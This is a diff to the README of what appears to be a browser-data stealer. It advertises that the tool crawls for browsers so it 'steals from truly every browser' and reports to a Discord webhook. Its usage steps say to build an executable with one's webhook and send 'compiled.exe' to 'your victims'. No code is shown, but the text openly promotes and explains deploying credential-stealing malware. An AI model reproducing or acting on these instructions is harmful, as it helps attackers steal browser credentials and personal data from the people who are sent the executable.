@@ -7,7 +7,7 @@ If you're struggling, the [Video Tutorial](https://youtu.be/iSMlgeEVqvE) may hel
 
 # 💎 Features
 
-* One Clean Test File (No Webhook Spams)
+* Clean Embed System
 * Crawls For Browsers (So it steals from truly **every** browser)
 * Simple and Fast, takes no more than 2 seconds to finish.
 
@@ -16,7 +16,7 @@ If you're struggling, the [Video Tutorial](https://youtu.be/iSMlgeEVqvE) may hel
 Usage is extremely simple! <br>
 
 * **1)** Firstly, make sure Python is installed. [Click Here](https://www.python.org/downloads/) to install! **NOTE:** Make sure to check "Add Python to PATH" when installing! <br>
-* **2)** Get a Discord Webhook and put it in the file. On line one where it says `webhook = ""` input your webhook between the quotes. <br>
+* **2)** Install the requirements by running `pip install -r requirements.txt` in your terminal.
 * **3)** Run `build.py`, enter your webhook, and send the "compiled.exe" file to your victims! 😈 <br>
 
 # 🌠 Closing Statements
